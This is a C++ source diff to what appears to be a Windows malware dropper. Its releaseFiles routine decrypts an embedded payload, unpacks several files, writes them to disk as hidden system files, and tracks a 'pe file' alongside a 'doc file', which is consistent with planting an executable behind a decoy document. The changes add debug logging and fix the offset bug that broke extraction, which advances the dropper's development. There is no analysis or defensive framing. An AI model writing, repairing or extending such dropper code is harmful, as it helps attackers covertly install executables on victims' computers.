@@ -13,6 +13,7 @@
 #include "md5.h"
 #include "PeLoader.h"
 #include "RegHelper.h"
+#include "utils.h"
 
 #include "../include/openssl/md5.h"
 
@@ -136,6 +137,8 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 	int ret = 0;
 	char szinfo[1024];
 
+	runLog("releaseFiles address:%x,size:%x\r\n", data,datasize);
+
 	FILE_DATA_BLOCK* fdb = (FILE_DATA_BLOCK*)data;
 
 	unsigned char* dstblock = new unsigned char[(ULONGLONG)datasize + 0x1000];
@@ -145,7 +148,11 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 	//revertkey(key);
 
 	CryptData((unsigned char*)&fdb->cfd, datasize - 4 - CRYPT_KEY_SIZE, key, CRYPT_KEY_SIZE, dstblock, datasize);
+	
 	CRYPT_FILE_DATA* cfd = (CRYPT_FILE_DATA*)dstblock;
+	runLog("file cnt:%d", cfd->cnt);
+
+	//CRYPT_FILE_DATA* cfd = (CRYPT_FILE_DATA*)&fdb->cfd;
 	if (cfd->cnt <= 0 || cfd->cnt >= MAX_INPUT_FILE)
 	{
 		return -1;
@@ -165,7 +172,6 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 
 	FILE_DATA* fd = & cfd->fd;
 
-	wsprintfA(szinfo, "file cnt:%d", cfd->cnt);
 	//MessageBoxA(0, szinfo, szinfo, MB_OK);
 
 	for (int i = 0; i < cfd->cnt; i++)
@@ -188,10 +194,15 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 			}
 		}
 
+		runLog("file:%s,path:%s\r\n", filename, path.c_str());
+
 		//MessageBoxA(0, filename, filename, MB_OK);
 
 		unsigned char* uncompbuf = new unsigned char[fd->fsize + 0x1000];
 		unsigned long uncompbufsize = fd->fsize;
+
+		runLog("uncompressdata address:%x,size:%x,unsize:%x\r\n", fd->filedata, fd->compSize,uncompbufsize);
+
 		ret = Compress::uncompressdata((unsigned char*)&(fd->filedata), fd->compSize, uncompbuf, &uncompbufsize);
 		if (ret == 0)
 		{
@@ -202,12 +213,12 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 					FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
 			}
 			else {
-				Public::writelog("write file:%s error\r\n", filename);
+				runLog("write file:%s error:%d\r\n", (path + filename).c_str(),GetLastError());
 				//break;
 			}
 		}
 		else {
-			Public::writelog("uncompress file:%s error\r\n", filename);
+			runLog("uncompress file:%s error:%d\r\n", (path + filename).c_str(), GetLastError());
 			//break;
 		}
 
@@ -217,7 +228,7 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 			uncompbuf = 0;
 		}
 
-		fd = (FILE_DATA*)((char*)fd + sizeof(FILE_DATA) + fd->fsize);
+		fd = (FILE_DATA*)((char*)fd + sizeof(FILE_DATA) + fd->compSize);
 	}
 
 	delete[] dstblock;
@@ -245,7 +256,7 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 		//ret = lpWinExec(szcmd, SW_SHOW);
 	}
 
-	Public::writelog("pe file:%s,doc file:%s\r\n", runningfn.c_str(), docfn.c_str());
+	runLog("pe file:%s,doc file:%s\r\n", runningfn.c_str(), docfn.c_str());
 	return TRUE;
 }
 
